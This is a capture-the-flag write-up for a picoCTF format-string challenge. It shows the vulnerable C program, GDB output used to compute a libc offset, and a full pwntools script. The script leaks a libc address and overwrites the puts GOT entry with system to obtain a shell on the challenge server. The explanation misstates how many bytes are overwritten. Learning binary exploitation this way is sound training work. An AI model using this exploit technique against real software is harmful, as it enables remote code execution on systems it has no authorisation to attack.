### Challenge Description
![image](https://github.com/user-attachments/assets/44f7b671-5c9f-4ab9-b696-278016e0007b)

--- 
```
char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);
	puts(normal_string);

	return 0;
}
```
Look at the source, we have puts() with a parameter is ``` /bin/sh ```. Therefore, we'll try to overwrite ``` puts ``` with ``` system ```.
Firstly, patch the file with the libc.so.6 they give us using pwninit.
The program prints out the address of ``` setvbuf ```. To take advantage of it, we'll find offset between ``` setvbuf ``` and ``` system ```. 
Then, subtract it and we'll get the address of ```system```.
``` 
gef➤  info func setvbuf
All functions matching regular expression "setvbuf":

Non-debugging symbols:
0x0000000000401070  setvbuf@plt
0x00007ffff7e5a3f0  _IO_setvbuf
0x00007ffff7e5a3f0  setvbuf
gef➤  p &system
$2 = (<text variable, no debug info> *) 0x7ffff7e2f760 <system>
gef➤  p/x 0x00007ffff7e5a3f0 - 0x7ffff7e2f760
$3 = 0x2ac90
```
However, we just need to overwrite 6 bytes LSB because the rest 6 bytes are the same. 
```
[0x404018] puts@GLIBC_2.2.5  →  0x7ffff7e59bf0
```  
Finally, here is my script:
```
#!/usr/bin/env python3

from pwn import *

# patch the file with libc first
exe = ELF("./format-string-3_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# log
def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))


# r = process(exe.path)
r = remote('rhea.picoctf.net', 59114)

r.recvuntil(b'setvbuf in libc: ')
setvbuf_addr = int(r.recvline()[:-1], 16)

slog('setvbuf: ', setvbuf_addr)

system = setvbuf_addr - 0x2ac90 # offset between system and setvbuf_addr = 0x2ac90

# we just need to overwrite 6 bytes LSB

part1 = system & 0xff
part2 = (system >> 8) & 0xffff

puts_got = 0x404018


payload = f'%{part1}c%41$hhn'.encode()

payload += f'%{part2-part1}c%42$hn'.encode()

# payload = payload.ljust(, b'a')

payload += p64(puts_got) + p64(puts_got + 1)

input()
r.sendline(payload)

r.interactive()
```
